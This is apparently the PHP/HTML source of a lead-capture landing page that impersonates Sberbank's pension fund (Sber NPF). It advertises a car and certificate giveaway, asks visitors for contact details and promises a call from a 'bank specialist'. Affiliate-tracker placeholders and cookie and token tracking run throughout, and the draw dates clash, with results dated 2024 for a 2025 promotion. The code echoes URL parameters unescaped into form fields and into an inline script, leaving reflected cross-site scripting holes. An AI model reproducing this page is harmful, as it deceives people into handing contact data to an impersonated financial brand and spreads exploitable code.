<?php
// if (!isset($rawClick) && !isset($click)) {
//   die();
// }
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Сбер НПФ</title>
    <link rel="stylesheet" href="./assets/css/styles.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
      rel="stylesheet"
    />
    </script>


     <script src="form/js/libs/intlTelInput.js"></script>

    <script>
  // Функция для получения значения параметра из URL
  function getUrlParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }

  // Проверяем наличие параметров
  const bgeValue = getUrlParam("bge");
  const crmSource = getUrlParam("crm_source");

  if (bgeValue) { 
    // Если есть только bgeValue – подключаем скрипты для bge
    let inlineScript = document.createElement("script");
    inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
    document.head.appendChild(inlineScript);

    // Подключаем второй скрипт для bge
    let asyncScript = document.createElement("script");
    asyncScript.src = "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
    document.head.appendChild(asyncScript);
    
    // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
    asyncScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
      console.log('Все скрипты для BGE загружены!');
    };

  } else if (!crmSource) { 
    // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
    let trackScript = document.createElement("script");
    trackScript.type = "application/javascript";
    trackScript.src = "track.js?v=21238";
    document.head.appendChild(trackScript);

    trackScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки track.js
      console.log('track.js загружен!');
    };

    let inlineScript = document.createElement("script");
    inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
    document.head.appendChild(inlineScript);

    inlineScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
      console.log('Inline script для альтернативы загружен!');
    };

    let parseScript = document.createElement("script");
    parseScript.type = "application/javascript";
    parseScript.src = "parse_url.js?v=19";
    document.head.appendChild(parseScript);

    parseScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
      console.log('parse_url.js загружен!');
    };
  }
</script>



    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
    

  </head>
  <body>
    <header class="header">
      <div class="header__logo">
        <img src="./assets/img/icons/logo.svg" alt="Logo" />
      </div>
      <div class="header__right">
        <nav class="header__nav">
          <ul class="header__menu">
            <li class="header__menu-item"><a href="#prizes">Призы</a></li>
            <li class="header__menu-item">
              <a href="">Правила участия в розыгрыше</a>
            </li>
            <li class="header__menu-item">
              <a href="#terms">Сроки проведения акции</a>
            </li>
            <li class="header__menu-item">
              <a href="#draw">Итоги розыгрыша</a>
            </li>
          </ul>
        </nav>
      </div>
    </header>
    <main class="main">
      <section class="section hero">
        <div class="hero__wrapper">
          <div class="hero__content">
            <span class="hero__subheading"
              >Сохраняй и приумножай со СберНПФ</span
            >
            <h1 class="hero__heading">
              Стань счастливым обладателем главного приза!
            </h1>
            <span class="hero__text">Автомобиль Geely Monjaro</span>
          </div>
          <a class="hero__button" href="#terms">Узнать сейчас</a>
          <img class="hero__image" src="./assets/img/hero_bg.png" alt="Image" />
        </div>
      </section>
      <section class="section prizes" id="prizes">
        <div class="prizes__heading">
          <h2>
            А еще мы разыграем сотни классных призов!<img
              src="./assets/img/icons/question.svg"
              alt="Icon"
            />
          </h2>
        </div>
        <div class="prizes__items-top">
          <div class="prizes__items-top--left">
            <div class="prizes__item">
              <span class="prizes__count">15 сертификатов</span>
              <img src="./assets/img/item-1.png" alt="Image" />
              <span class="prizes__name"
                >Сертификат от МегаМаркет номиналом 20 000 ₽</span
              >
            </div>
            <div class="prizes__item">
              <span class="prizes__count">228 сертификатов</span>
              <img src="./assets/img/item-2.png" alt="Image" />
              <span class="prizes__name"
                >Сертификат от Купер номиналом 3 000 ₽</span
              >
            </div>
          </div>
          <div class="prizes__items-top--right">
            <div class="prizes__item">
              <span class="prizes__count">4800 сертификатов*</span>
              <img src="./assets/img/item-3.png" alt="Image" />
              <span class="prizes__name"
                >Сертификат от Самокат номиналом 1 000 ₽</span
              >
            </div>
            <div class="prizes__item">
              <span class="prizes__count">30 колонок</span>
              <img src="./assets/img/item-4.png" alt="Image" />
              <span class="prizes__name">Колонки SberBoom mini</span>
            </div>
          </div>
        </div>
        <div class="prizes__items-bottom">
          <div class="prizes__item bottom">
            <span class="prizes__count bottom">15 смартфонов</span>
            <img src="./assets/img/phone.png" alt="Image" />
            <span class="prizes__name bottom left"
              >Крутые смартфоны от Samsung</span
            >
          </div>
          <div class="prizes__item bottom">
            <span class="prizes__count bottom">3 путешествия</span>
            <img src="./assets/img/bag.png" alt="Image" />
            <span class="prizes__name bottom"
              >Сертификаты на путешествие номиналом 500 000 ₽</span
            >
          </div>
        </div>
      </section>
      <section class="section draw" id="draw">
        <h2 class="draw__heading">Итоги розыгрыша</h2>
        <video
          src="./assets/img/video.mp4"
          preload="metadata"
          poster="./assets/img/thumbnail.png"
          playsinline
          controls
        ></video>
        <ul class="draw__list">
          <li class="draw__item">
            <div class="draw__icon">
              <img src="./assets/img/icons/pdf.svg" alt="Icon" />
            </div>
            <span class="draw__descr">1 этап. Гарантированные призы</span>
          </li>
          <li class="draw__item">
            <div class="draw__icon">
              <img src="./assets/img/icons/pdf.svg" alt="Icon" />
            </div>
            <span class="draw__descr">1 этап. Итоги розыгрыша 14.10.2024</span>
          </li>
          <li class="draw__item">
            <div class="draw__icon">
              <img src="./assets/img/icons/pdf.svg" alt="Icon" />
            </div>
            <span class="draw__descr">2 этап. Гарантированные призы</span>
          </li>
          <li class="draw__item">
            <div class="draw__icon">
              <img src="./assets/img/icons/pdf.svg" alt="Icon" />
            </div>
            <span class="draw__descr">2 этап. Итоги розыгрыша 12.11.2024</span>
          </li>
          <li class="draw__item">
            <div class="draw__icon">
              <img src="./assets/img/icons/pdf.svg" alt="Icon" />
            </div>
            <span class="draw__descr">3 этап. Гарантированные призы</span>
          </li>
          <li class="draw__item">
            <div class="draw__icon">
              <img src="./assets/img/icons/pdf.svg" alt="Icon" />
            </div>
            <span class="draw__descr">3 этап. Итоги розыгрыша 04.12.2024</span>
          </li>
          <li class="draw__item">
            <div class="draw__icon">
              <img src="./assets/img/icons/pdf.svg" alt="Icon" />
            </div>
            <span class="draw__descr"
              >Итоги розыгрыша главного приза 15.12.2024</span
            >
          </li>
          <li class="draw__item">
            <div class="draw__icon">
              <img src="./assets/img/icons/pdf.svg" alt="Icon" />
            </div>
            <span class="draw__descr">Итоги перерозыгрыша 15.12.2024</span>
          </li>
        </ul>
      </section>
      <section class="section terms" id="terms">
        <h2 class="terms__heading">Сроки проведения акции</h2>
        <div class="terms__text-wrapper">
          <p class="terms__text">
            Общий срок проведения акции: c 1 февраля по 30 августа 2025 года.В
            рамках Акции состоится несколько этапов розыгрышей: 14 апреля 2025
            года; 12 июля 2025 года; 30 августа 2025 года. Главный приз —
            автомобиль Geely Monjaro — будет разыгран 30 августа 2025 года.
          </p>
          <p class="terms__text">
            Организатор Акции: АО «НПФ Сбербанка» (115162, г. Москва, ул.
            Шаболовка, д. 31, корп. Г, офис: 4 подъезд, 3 этаж, ИНН 7725352740;
            КПП 772501001).
          </p>
          <p class="terms__text">
            Оператор Акции: ООО «Капибара» (105082, г. Москва, ул. Бакунинская,
            дом 73, строение 2, помещение I; ИНН 7718969588; КПП 770101001).
          </p>
        </div>
        <div class="terms__items">
          <div class="terms__item">
            <img src="./assets/img/doc.svg" alt="Image" />
            <span>1.Пройдите регистрацию</span>
          </div>
          <div class="terms__item">
            <img src="./assets/img/phone.svg" alt="Image" />
            <span>2.Дождитесь звонка специалиста нашего банка</span>
          </div>
        </div>
        <button class="terms__button form-button" type="button">
          Участвовать
        </button>
        <p class="terms__info">
          *Розыгрыш сертификатов от Самокат будет проводиться постепенно в три
          этапа: 1600 сертификатов будут разыграны до 14.04.2025; 1600 - до
          12.07.2025; и еще 1600 - до 30.08.2025
        </p>
      </section>
    </main>
    <footer class="footer">
      <div class="footer__top">
        <p class="footer__text">
          © 2009–2025 Акционерное общество
          <span class="accent"
            >«Негосударственный Пенсионный Фонд Сбербанка»</span
          >
          Лицензия №41/2 от 16.06.2009 г. выдана Федеральной службой по
          финансовым рынкам. ИНН/ КПП 7725352740/772501001, ОГРН 1147799009160
        </p>
        <img src="./assets/img/agency-logo.svg" alt="Logo" />
      </div>
      <div class="footer__bottom">
        <span class="footer__link top"
          >Информация для потребителей финансовых услуг</span
        >
        <span class="footer__link bottom"
          >Рекомендации по защите информации</span
        >
      </div>
    </footer>
    <div id="question1" class="modal hidden">
      <div class="modal-content">
        <h2 class="question-header">Вы гражданин РФ?</h2>
        <button class="question-button" type="button">Да</button>
        <button class="question-button" type="button">Нет</button>
      </div>
    </div>
    <div id="question2" class="modal hidden">
      <div class="modal-content">
        <h2 class="question-header">Ваш возраст?</h2>
        <button class="question-button" type="button">до 18</button>
        <button class="question-button" type="button">18-24</button>
        <button class="question-button" type="button">24-50</button>
        <button class="question-button" type="button">50-70</button>
      </div>
    </div>
    <div id="modal" class="modal hidden">
      <div class="modal-content">
        <form class="form _main-form contact-form" id="main-form" method="post">
          <h2 class="form-heading">
            Заполните данные и наш менеджер свяжется с вами
          </h2>
          <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
                        <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
                        <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'>
                        <input type="hidden" id="bge" value='<?= $_GET['bge'] ?>'>
                        <input type="hidden" id="source" value='<?= $_GET['source'] ?>'>
        </form>
      </div>
    </div>
    <script src="./assets/js/main.js"></script>
     <script src="loadAssets.js?v=54"></script>

    <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
